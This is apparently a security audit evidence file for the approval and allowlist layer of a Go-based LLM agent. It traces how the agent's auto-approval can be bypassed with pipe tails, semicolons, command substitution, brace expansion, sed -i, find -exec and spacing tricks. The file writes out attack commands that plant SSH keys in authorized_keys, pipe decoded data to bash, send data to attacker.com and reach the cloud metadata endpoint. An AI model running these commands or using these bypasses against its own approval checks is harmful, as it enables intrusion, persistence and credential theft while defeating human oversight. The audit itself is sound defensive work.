# Evidence File: Team-02 Round 1-3
# Consolidated evidence for all validated hypotheses

## EVIDENCE FOR PH-01 / CROSS-01: Pipe Target Bypass (CRITICAL)

**Primary evidence**:
- `x/agent/approval.go:206`: `parts := strings.Split(command, "|")` — only `parts[0]` is examined by extractBashPrefix; all pipe tail segments completely ignored
- `x/agent/approval.go:207`: `firstCmd := strings.TrimSpace(parts[0])` — pipe tail is discarded
- `x/agent/approval.go:218-222`: safeCommands includes `cat`, `grep`, `find`, `sed` — seeds for prefix allowlisting
- `x/agent/approval.go:95-122` (denyPatterns): `tee` absent, `bash` absent, `sh` absent, `base64` absent from entire list
- `x/cmd/run.go:404`: `IsAllowed` check runs BEFORE tool execution; if true, no prompt shown
- **Specific attack**: `cat tools/run.go | tee ~/.ssh/authorized_keys` → IsDenied=false, IsAllowed=true (cached `cat:tools/`), bash executes write to authorized_keys
- **Broader attack**: `cat tools/a.go | base64 -d | bash` → IsDenied=false (bash not in denyPatterns), IsAllowed=true, bash executes decoded arbitrary payload
**Fragility**: SOLID — the pipe-only split at line 206 is a structural decision, not an edge case; any multi-command pipeline exploits this

---

## EVIDENCE FOR PH-09 / CROSS-06: SSH authorized_keys Gap (CRITICAL)

**Primary evidence**:
- `x/agent/approval.go:113-114`: denyPathPatterns lists `.ssh/id_rsa`, `.ssh/id_dsa`, `.ssh/id_ecdsa`, `.ssh/id_ed25519`, `.ssh/config` — all 5 SSH private key files blocked
- **MISSING**: `.ssh/authorized_keys` — not present in any deny pattern or denyPathPattern
- Confirmed via grep: no match for `authorized_keys` in approval.go
- `x/agent/approval.go:206`: pipe split means `| tee ~/.ssh/authorized_keys` is invisible to extractBashPrefix
- `x/agent/approval.go:503`: `isCommandOutsideCwd` detects `~/.ssh/authorized_keys` (via `~` detection) but this result is ONLY used for warning display, never blocking
- `x/cmd/run.go:404`: auto-approval (IsAllowed=true) bypasses RequestApproval entirely, so the warning is never shown
**Attack sequence**:
1. Any prior `cat:tools/` approval (e.g., LLM reads any .go file in tools/)
2. LLM issues: `cat tools/attacker_pubkey.go | tee ~/.ssh/authorized_keys`
3. No prompt shown, no warning shown, command executes
4. Attacker has SSH access to machine
**Fragility**: SOLID — three independent gaps must ALL be fixed to prevent this attack

---

## EVIDENCE FOR PH-04 / CROSS-03: Command Substitution in Path (CRITICAL)

**Primary evidence**:
- `x/agent/approval.go:253`: `cleaned := path.Clean(arg)` — `path.Clean` is explicitly documented as lexical; does not resolve `$()`, backticks, `$VAR`
- `x/agent/approval.go:210`: `fields := strings.Fields(firstCmd)` — splits on whitespace only; does not understand shell quoting or expansion syntax
- `x/agent/approval.go:449-451`: `matchesHierarchicalPrefix` uses `strings.HasPrefix(currentPath, storedPath)` — `"tools/$(id)/"` starts with `"tools/"` → match
- **Trace for `cat tools/$(id)/a.go`**:
  - extractBashPrefix returns `"cat:tools/$(id)/"` (path.Dir of `tools/$(id)/a.go`)
  - matchesHierarchicalPrefix: `strings.HasPrefix("tools/$(id)/", "tools/")` = TRUE → auto-approved
  - bash executes: cat of `tools/<output-of-id>/a.go` — the subshell executes during path expansion
- **For simpler `cat tools/$(id)`**: extractBashPrefix returns `"cat:./"`; stored `cat:tools/` does NOT hierarchically match `cat:./` — this simpler form may not match. The form WITH a trailing path component (`$(id)/a.go`) is needed for hierarchical match.
- **Alternative**: `cat tools/a$(python3 -c "import os; os.system('id')")` — the `$()` executes at bash command expansion regardless of whether the file exists; the python code runs as a side effect
**Fragility**: SOLID — `path.Clean` being lexical is a documented property, not a bug in path.Clean itself; the bug is using it for security purposes against shell-expanded paths

---

## EVIDENCE FOR PH-02 / CROSS-04: sed -i Silent File Modification (HIGH)

**Primary evidence**:
- `x/agent/approval.go:222`: `"sed": true` in safeCommands map — confirmed present
- `x/agent/approval.go:232-234`: flag-skipping logic: `if strings.HasPrefix(arg, "-") { continue }` — `-i` is skipped, invisible to prefix extraction
- `x/agent/approval.go:503`: `isCommandOutsideCwd` not called for auto-approved commands (IsAllowed=true path)
- **Attack trace for `sed -i 's/exit 0/curl attacker.com|sh/' tools/deploy.sh`**:
  - extractBashPrefix: `baseCmd="sed"` (safeCommand); `-i` skipped; `'s/exit...'` does not contain `/` → skip; `tools/deploy.sh` → contains `/` → `path.Dir` → `"tools"` → returns `"sed:tools/"`
  - After `sed:tools/` stored: auto-approved
  - bash: `sed -i` modifies `tools/deploy.sh` in place, injecting a curl backdoor
- **No test coverage**: approval_test.go has no test for `sed -i` after prefix approval
**Fragility**: SOLID — `sed` having write capability via `-i` is a fundamental mismatch with `safeCommands` intent

---

## EVIDENCE FOR PH-03: find -exec bash Execution (HIGH)

**Primary evidence**:
- `x/agent/approval.go:221`: `"find": true` in safeCommands
- `x/agent/approval.go:95-122`: no deny pattern for `bash` standalone, `-exec`, or `find -exec`
- **Attack trace for `find tools/ -exec bash {} \;`**:
  - IsDenied: no matching pattern → PASSES
  - extractBashPrefix: `baseCmd="find"` (safeCommand); `tools/` → `path.Clean("tools/")="tools"` → `"find:tools/"`
  - Auto-approved when `find:tools/` stored
  - bash: executes bash on every file in tools/ — all .go, .sh, .json etc treated as bash scripts
- Confirmed: `find -exec rm -rf {} \;` BLOCKED by IsDenied (contains "rm -rf"); but `find -exec bash {}` and `find -exec curl` NOT blocked
**Fragility**: SOLID

---

## EVIDENCE FOR PH-06 / CROSS-02: Semicolon Injection (HIGH)

**Primary evidence**:
- `x/agent/approval.go:206`: `strings.Split(command, "|")` — ONLY splits on `|`, not `;`, `&&`, `||`
- `x/agent/approval.go:321` (isCommandOutsideCwd): splits on `|`, `;`, `&` — but this function is advisory only
- **extractBashPrefix does NOT split on `;`** — confirmed: only `|` split at line 206
- **Attack trace for `cat tools/a.go; curl http://attacker.com/$(cat /tmp/sensitive | base64)`**:
  - IsDenied: no matching pattern
  - extractBashPrefix: `strings.Split` on `|` → single part (no `|` in command); `firstCmd = "cat tools/a.go; curl ..."`. `strings.Fields` → `["cat", "tools/a.go;", "curl", ...]`. First non-flag path arg: `"tools/a.go;"` → contains `/` → path-like. `path.Clean("tools/a.go;")` = `"tools/a.go;"` — the semicolon is treated as part of the filename. `path.Dir("tools/a.go;")` = `"tools"`. Returns `"cat:tools/"`.
  - Auto-approved; bash interprets `;` as command separator and runs both commands
**Fragility**: SOLID — the `;` is lexically opaque to `strings.Fields` path extraction

---

## EVIDENCE FOR PH-07: Non-bash Blanket Approval (HIGH)

**Primary evidence**:
- `x/agent/approval.go:477`: `a.allowlist[toolName] = true` — for non-bash tools, only toolName (not args) stored
- `x/agent/approval.go:418-420`: `if toolName != "bash" && a.allowlist[toolName] { return true }` — any stored tool name auto-approves ALL future calls
- `x/cmd/run.go:427-429`: `case agent.ApprovalAlways: approval.AddToAllowlist(toolName, args)` — ApprovalAlways triggers AddToAllowlist
- **web_fetch trace**:
  - First call with benign URL: user approves with "Allow for this session" → `AddToAllowlist("web_fetch", {...})` → `a.allowlist["web_fetch"] = true`
  - Subsequent call with `http://169.254.169.254/latest/meta-data/iam/security-credentials/`: `IsAllowed("web_fetch", ...)` → `a.allowlist["web_fetch"]` = true → auto-approved → `WebFetchTool.Execute` with SSRF URL
- `x/tools/webfetch.go:85`: only `url.Parse` validation — no scheme filtering, no IP range filtering
**Fragility**: SOLID

---

## EVIDENCE FOR PH-11: IsDenied Double-Space Bypass (HIGH)

**Primary evidence**:
- `x/agent/approval.go:180`: `if strings.Contains(commandLower, strings.ToLower(pattern))` — raw substring match
- No normalization step before the check (no `strings.Fields` + rejoin)
- `"rm  -rf"` (2 spaces): `strings.Contains("rm  -rf /", "rm -rf")` = FALSE
- `"rm\t-rf"` (tab): also bypasses
- `echo <base64> | base64 -d | bash`: outer command contains no deny pattern; bash decodes and executes arbitrary content
- **Also bypasses**: `"sudo"` → `"sudo"` vs `"sudo "` (trailing space required): `echo test | sudo -i` → `strings.Contains("echo test | sudo -i", "sudo ")` → `"sudo "` appears in `"sudo -i"` (followed by `-`) but `"sudo "` in the deny list has trailing space; `"| sudo -i"` contains `"sudo "` → actually BLOCKED. But `"sudoedit"` → not blocked since it doesn't contain `"sudo "`.
**Fragility**: SOLID

---

## EVIDENCE FOR PH-17 / CROSS-02: grep Multi-Path (HIGH)

**Primary evidence**:
- `x/agent/approval.go:231-285`: extractBashPrefix loops through args and returns on finding the FIRST path-like argument; no further args processed
- `x/agent/approval.go:284`: `return fmt.Sprintf("%s:%s/", baseCmd, dir)` — immediate return after first match
- **Attack trace for `grep -r "" api/ /home/user/`**: `api/` is found first → `"grep:api/"` returned → additional `/home/user/` arg ignored
**Fragility**: SOLID — "first path wins" is a structural decision

---

## EVIDENCE FOR PH-10: Brace Expansion (HIGH)

**Primary evidence**:
- `x/agent/approval.go:253`: `path.Clean(arg)` — brace content `{a,b}` is opaque to path.Clean
- `x/agent/approval.go:262`: `if strings.Contains(arg, "..")` check — but `{safe.go,../../etc/passwd}` contains `..` → triggers sibling check
- Sibling check: `origBase = strings.SplitN("tools/{safe.go,../../etc/passwd}", "/", 2)[0]` = `"tools"`. `cleanedBase = strings.SplitN(path.Clean("tools/{safe.go,../../etc/passwd}"), "/", 2)[0]` = `"tools"` (path.Clean doesn't resolve braces). `origBase == cleanedBase` → sibling check PASSES (no escape detected). Returns `"cat:tools/"`.
- bash expands `{safe.go,../../etc/passwd}` to two separate paths at execution time
**Fragility**: SOLID — brace expansion is a bash-layer operation invisible to all Go-level string processing

---

## EVIDENCE FOR PH-16: isCommandOutsideCwd Advisory Only (MEDIUM)

**Primary evidence**:
- `x/agent/approval.go:503`: `if isCommandOutsideCwd(cmd) { isWarning = true; warningMsg = "..." }`
- `x/cmd/run.go:404`: `else if !skipApproval && !approval.IsAllowed(toolName, args)` — `RequestApproval` only called when IsAllowed is FALSE
- When `IsAllowed` = true (cached prefix): `RequestApproval` NOT called → `isCommandOutsideCwd` NOT evaluated → no warning shown
- `x/agent/approval.go:312-374`: `isCommandOutsideCwd` is more thorough (splits on `|`,`;`,`&`) than `extractBashPrefix` but its result is architecturally unable to protect auto-approved commands
**Fragility**: SOLID

---

## INVALIDATED HYPOTHESES (Evidence of Non-Exploitability)

**PH-13 (Unknown tool name)**: `x/tools/registry.go:95` — `tool, ok := r.tools[...]; if !ok { return "", fmt.Errorf("unknown tool: %s") }` — safe map lookup
**PH-14 (fallbackApproval non-TTY)**: `x/agent/approval.go:960-969` — empty/EOF input hits `default:` → `ApprovalDeny` — fails closed safely
**PH-15 (Race condition)**: `x/cmd/run.go:369` — single-goroutine sequential iteration; mutex correctly placed in `IsAllowed`/`AddToAllowlist`

---

## NEEDS-DEEPER ITEMS

**PH-12 (autoAllowPrefixes)**: Dead code (run.go:391-394 commented out) but TODO indicates active development intent; `make`, `go test`, `npm run` are code-executing commands in the auto-allow list
**PH-20 (prompt injection via tool output)**: Architecturally enabled but model-dependent
**PH-22 (web_fetch file:// scheme)**: Sent to ollama.com API not processed locally; SSRF via proxy depends on API behavior
**CROSS-05 (autoAllow+YoloMode future)**: Future risk if TODO re-enabled
